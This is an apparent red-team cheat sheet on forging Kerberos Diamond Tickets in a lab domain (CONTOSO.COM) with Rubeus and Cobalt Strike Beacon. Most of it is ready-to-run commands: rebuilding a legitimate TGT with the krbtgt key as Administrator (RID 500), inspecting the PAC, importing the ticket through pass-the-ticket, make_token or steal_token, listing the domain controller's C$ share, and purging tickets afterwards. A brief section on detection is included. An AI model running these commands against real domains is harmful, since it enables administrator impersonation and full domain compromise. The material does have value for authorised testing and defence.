---
title: "Kerberos Diamond Tickets"
description: "Modify a legitimately obtained TGT with the krbtgt key, inspect the original and modified PAC, then import and verify the resulting identity."
category: "Domain Dominance"
tools: ["Cobalt Strike", "Rubeus", "Kerbeus BOF"]
updated: 2026-11-16
tags: ["domain-dominance", "kerberos", "diamond-ticket", "ticket-forgery"]
draft: false
---

## 1. Why the attack works

A Diamond Ticket starts from a legitimate usable TGT. With the corresponding `krbtgt` key, the tool can decrypt it, change identity and authorization data, and rebuild the signed and encrypted ticket.

The legitimate starting ticket provides real issuance history and original fields such as times. This does not make the modified ticket undetectable: inconsistent names, identifiers or PAC fields can still expose the change, and the KDC must accept the resulting ticket.

| Input | Role |
|---|---|
| Usable legitimate TGT | Starting ticket and associated session material |
| `krbtgt` AES256 key | Decrypt and rebuild the TGT in this example |
| Target username and RID | Identity inserted into the modified ticket |

## 2. Obtain and modify the starting TGT

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:<KRBTGT_AES256_KEY> /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
# Retain both the original and modified ticket output.
# Import the modified ticket, not the original one.
```

`/tgtdeleg` uses the current authentication context to obtain usable TGT material through the tool's delegation mechanism. It needs a context and environment where that method succeeds; it does not create a valid user TGT from nothing. This step also does not recover `krbtgt`'s key: that is already a prerequisite.

## 3. Compare the original and modified PAC

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:<KRBTGT_AES256_KEY> /ticket:<ORIGINAL_TGT_BASE64>
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:<KRBTGT_AES256_KEY> /ticket:<MODIFIED_TGT_BASE64>
```

Check client identity, user RID, groups, validity fields and signature information. In the supplied example, a name field can retain Polly Childs while the modified identity is Administrator. A successful change of the username alone does not prove that every PAC field is consistent.

The example sets RID `500` for the lab's built-in Administrator. Inspect the resulting groups instead of assuming that changing `/ticketuser` also selects exactly the group memberships you intended.

## 4. Import and verify

```shell
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<MODIFIED_TGT_BASE64>
beacon> run klist
# Confirm Administrator -> krbtgt/CONTOSO.COM.
beacon> ls \\lon-dc-1\c$
beacon> run klist
# Review the resulting CIFS ticket and actual access outcome.
```

## Ticket import alternatives

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<MODIFIED_TGT_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO /username:Administrator /password:FakePass /ticket:<MODIFIED_TGT_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

## Session cleanup

Purge the disposable network-only session while its token is still selected, then restore Beacon's original token. `rev2self` alone does not purge tickets.

```shell
# Native cleanup
beacon> kerberos_ticket_purge
beacon> rev2self
```

## Troubleshooting and detection

| Symptom | Check |
|---|---|
| `/tgtdeleg` fails | Current domain context, ticket availability, target selection and delegation behavior |
| Original identity remains | Correct output selected for import and correct logon session |
| PAC cannot be decrypted | Matching `krbtgt` encryption key and ticket type |
| Modified ticket rejected | Signature validation, key version, account restrictions and field consistency |

A real starting TGT means that checking only for a missing AS exchange is insufficient. Inspect inconsistent PAC identity fields and correlate account activity. Modified tickets and extracted `krbtgt` material require the same domain-key compromise response as other `krbtgt`-based forgery.

## Quick checklist

```text
OBTAIN AND MODIFY
[ ] Confirm a usable legitimate TGT and the matching krbtgt AES256 key are available.
[ ] Verify that the current context supports the selected /tgtdeleg acquisition path.
[ ] Rubeus diamond /tgtdeleg /krbkey:<KRBTGT_AES256_KEY> /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap.
[ ] Retain both original and modified outputs.
[ ] Describe both tickets with the matching /servicekey.
[ ] Compare client identity, RID, groups, timestamps, signatures and remaining original-user fields.
[ ] Select the modified TGT for import, not the legitimate starting ticket.

IMPORT AND VERIFY — CHOOSE ONE PATH
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<MODIFIED_TGT_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
# Rubeus Alternative
[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<MODIFIED_TGT_BASE64>
[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
[ ] run klist -> verify the selected session, client identity, target and expiry.
[ ] ls \\lon-dc-1\c$ -> verify actual service authorization.
[ ] Recheck klist for the service ticket requested using the imported TGT.

CLEANUP
[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
[ ] rev2self -> restore the original token.
[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
```

## Related references

- [DCSync](/cheatsheets/dcsync-cheatsheet/)
- [Golden Tickets](/cheatsheets/golden-ticket-cheatsheet/)
- [Rubeus](https://github.com/GhostPack/Rubeus)
